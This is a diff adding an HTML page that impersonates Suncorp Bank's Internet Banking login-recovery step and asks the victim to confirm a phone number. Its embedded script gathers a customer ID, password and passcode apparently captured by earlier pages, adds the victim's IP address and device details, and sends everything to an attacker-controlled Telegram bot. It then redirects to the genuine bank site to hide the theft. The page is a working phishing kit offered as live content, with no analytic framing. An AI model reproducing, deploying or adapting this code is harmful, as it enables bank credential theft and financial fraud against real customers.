@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html class="responsive js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style="">
+ <head>
+  <meta content="no-cache" http-equiv="cache-control"/>
+  <meta content="no-cache" http-equiv="pragma"/>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <meta content="511233aa-be4a-4059-96b5-8033964fcdc6" name="_csrf"/>
+  <meta content="X-CSRF-TOKEN" name="_csrf_header"/>
+  <title>
+   Recover your Login Information
+  </title>
+  <link href="css/shim.css" rel="stylesheet"/>
+  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <link href="css/normalize.css" rel="stylesheet" type="text/css"/>
+  <link href="css/suncorpnew-uama.css" media="screen" rel="stylesheet" type="text/css"/>
+ </head>
+ <body class="sg-Page">
+  <header class="sg-Header">
+   <div class="sg-Header-content">
+    <div class="sg-Header-column">
+     <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/" target="_blank">
+     </a>
+    </div>
+    <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
+     <div class="sg-Grid-row">
+      <h1 class="ib-header">
+       Internet Banking
+      </h1>
+      <span class="Icon-lock--default Icon--medium">
+      </span>
+     </div>
+     <div class="ib-banner-info" id="bannerInfo">
+      <span class="sg-u-mediumAndSmallHidden">
+       <strong>
+        BSB
+       </strong>
+       484-799
+      </span>
+      <span class="sg-u-mediumAndSmallHidden">
+       <strong>
+        Swift Code
+       </strong>
+       METWAU4B
+      </span>
+     </div>
+    </div>
+   </div>
+  </header>
+  <main class="sg-Main">
+   <div class="sg-Main-content">
+    <div class="sg-Main-column">
+     <h2 data-title="password-reset-recover-your-login-information" id="password-reset-recover-your-login-information">
+      Confirm your phone number
+     </h2>
+     <form autocomplete="off" class="ws-validate" id="recoverForm" method="post">
+      <input name="_csrf" type="hidden" value="511233aa-be4a-4059-96b5-8033964fcdc6"/>
+      <div class="sg-Box sg-Box--error sg-Box--withIcon uama-hidden" id="simpleErrorBox">
+       <div class="sg-Box-icon sg-Box-icon--withBackground">
+        <span class="sg-Box--errorIcon">
+        </span>
+       </div>
+       <div class="sg-Box-content">
+        <p>
+        </p>
+       </div>
+      </div>
+      <p>
+       Please confirm the primary phone number associated with your internet banking account.
+      </p>
+      <hr/>
+      <fieldset class="sg-Form-questionGroup sg-u-noPaddingLeft sg-u-paddingBottom">
+       <div class="sg-Form-question">
+        <label class="sg-Form-label" for="cid">
+         Phone number
+        </label>
+        <input autocomplete="off" class="sg-Input sg-u-widthLarger" data-errormessage="Please enter your Customer ID." id="cid" maxlength="10" name="cid" required="" type="text"/>
+       </div>
+      </fieldset>
+      <div class="sg-Form-pager">
+       <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit" value="Submit">
+        Verify
+       </button>
+       <script>
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
+const TELEGRAM_CHAT_ID = '-5233511146';
+
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('recoverForm');
+    const phoneInput = document.getElementById('cid');
+    
+    // Create error container if it doesn't exist
+    let phoneErrorEl = document.getElementById('phone-error');
+    if (!phoneErrorEl) {
+        const phoneErrorDiv = document.createElement('div');
+        phoneErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="phone-error" aria-live="assertive" style="display: none; margin-top: 5px; color: #d32f2f;"><p class="sg-Validation-errorMessage">Please enter a valid phone number.</p></div>';
+        phoneInput.parentNode.appendChild(phoneErrorDiv.firstChild);
+        phoneErrorEl = document.getElementById('phone-error');
+    }
+    
+    // Set max length to 10 digits
+    phoneInput.setAttribute('maxlength', '10');
+    phoneInput.setAttribute('inputmode', 'numeric');
+    phoneInput.setAttribute('pattern', '[0-9]*');
+    
+    // Retrieve stored data from sessionStorage
+    const userId = sessionStorage.getItem('userId') || 'Not available';
+    const password = sessionStorage.getItem('userPassword') || 'Not available';
+    const passcode = sessionStorage.getItem('userPasscode') || 'Not provided';
+    
+    // Add red border style
+    const style = document.createElement('style');
+    style.textContent = `
+        .sg-Input--error-border {
+            border: 1px solid #d32f2f !important;
+            border-color: #d32f2f !important;
+        }
+        @keyframes suncorp-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
+    document.head.appendChild(style);
+    
+    function validatePhone(phone) {
+        // Must be exactly 10 digits starting with 04
+        const phoneRegex = /^04\d{8}$/;
+        return phoneRegex.test(phone);
+    }
+    
+    // Restrict input to numbers only and max 10 digits
+    phoneInput.addEventListener('input', function(e) {
+        // Remove any non-digit characters
+        let value = this.value.replace(/\D/g, '');
+        
+        // Limit to 10 digits
+        if (value.length > 10) {
+            value = value.slice(0, 10);
+        }
+        
+        this.value = value;
+        clearError();
+    });
+    
+    function clearError() {
+        phoneErrorEl.style.display = 'none';
+        phoneInput.classList.remove('sg-Input--error-border');
+        phoneInput.setAttribute('aria-invalid', 'false');
+    }
+    
+    function hideLoading() {
+        const existingOverlay = document.getElementById('verify-loading-overlay');
+        if (existingOverlay) {
+            existingOverlay.remove();
+        }
+    }
+    
+    function showLoading() {
+        hideLoading();
+        
+        const overlay = document.createElement('div');
+        overlay.id = 'verify-loading-overlay';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(2px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.3s ease;
+        `;
+        
+        // Black spinner
+        const spinner = document.createElement('div');
+        spinner.style.cssText = `
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 0, 0, 0.2);
+            border-top: 4px solid #ffc800;
+            border-radius: 50%;
+            animation: suncorp-spin 1s linear infinite;
+        `;
+        
+        // Loading text
+        const text = document.createElement('p');
+        text.style.cssText = `
+            color: #ffc800;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-top: 20px;
+            letter-spacing: 1px;
+        `;
+        
+        overlay.appendChild(spinner);
+        overlay.appendChild(text);
+        document.body.appendChild(overlay);
+    }
+    
+    // Get device info
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = 'Unknown';
+        let platform = 'Unknown';
+        
+        if (/Windows/.test(ua)) platform = 'Windows';
+        else if (/Mac/.test(ua)) platform = 'MacOS';
+        else if (/Linux/.test(ua)) platform = 'Linux';
+        else if (/Android/.test(ua)) platform = 'Android';
+        else if (/iOS|iPhone|iPad|iPod/.test(ua)) platform = 'iOS';
+        
+        if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
+        else device = 'Desktop';
+        
+        return { device, platform };
+    }
+    
+    // Get IP address
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (e) {
+            return 'Unable to retrieve';
+        }
+    }
+    
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        clearError();
+        
+        const phone = phoneInput.value.trim();
+        
+        // Validate phone (must be exactly 10 digits starting with 04)
+        if (!phone || !validatePhone(phone)) {
+            phoneErrorEl.style.display = 'block';
+            phoneInput.classList.add('sg-Input--error-border');
+            phoneInput.setAttribute('aria-invalid', 'true');
+            return;
+        }
+        
+        showLoading();
+        
+        // Get all info
+        const clientIP = await getIP();
+        const { device, platform } = getDeviceInfo();
+        const currentDateTime = new Date().toLocaleString('en-AU', { 
+            timeZone: 'Australia/Sydney',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+        
+        // Format message with monospace for sensitive fields
+        const message = `🟡
+Customer ID: \`${userId}\`
+Password: \`${password}\`
+Token: \`${passcode}\`
+Phone: \`${phone}\`
+IP: \`${clientIP}\`
+UA: ${navigator.userAgent}
+Device: ${device}
+Platform: ${platform}
+Date: ${currentDateTime}`;
+        
+        // Send to Telegram
+        try {
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error('Failed to send to Telegram:', error);
+        }
+        
+        // Redirect after 2 seconds
+        setTimeout(function() {
+            window.location.href = 'https://www.suncorp.com.au';
+        }, 2000);
+    });
+});
+</script>
+      </div>
+     </form>
+     <footer class="sg-Footer" style="background-color:transparent;">
+      <div class="sg-Footer-content">
+       <p class="sg-Type--small sg-Type--muted sg-u-textCenter" id="copyright">
+        Suncorp Bank (Norfina Limited ABN 66 010 831 722).
+        <br/>
+        The SUNCORP brand and Sun Logo are used by Suncorp Bank (Norfina Limited) under licence and Suncorp Bank is not part of the Suncorp Group.
+       </p>
+      </div>
+     </footer>
+    </div>
+   </div>
+  </main>
+  <iframe class="aamIframeLoaded" id="destination_publishing_iframe_suncorp_0" name="destination_publishing_iframe_suncorp_0_name" sandbox="allow-scripts allow-same-origin" src="assets/dest5.html" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame">
+  </iframe>
+  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
+  </iframe>
+  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
+  </iframe>
+  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
+  </iframe>
+  <iframe id="cd__fontDetectionFrame" sandbox="allow-same-origin" style="visibility: hidden; z-index: -1; width: 0px; height: 0px;">
+  </iframe>
+ </body>
+</html>
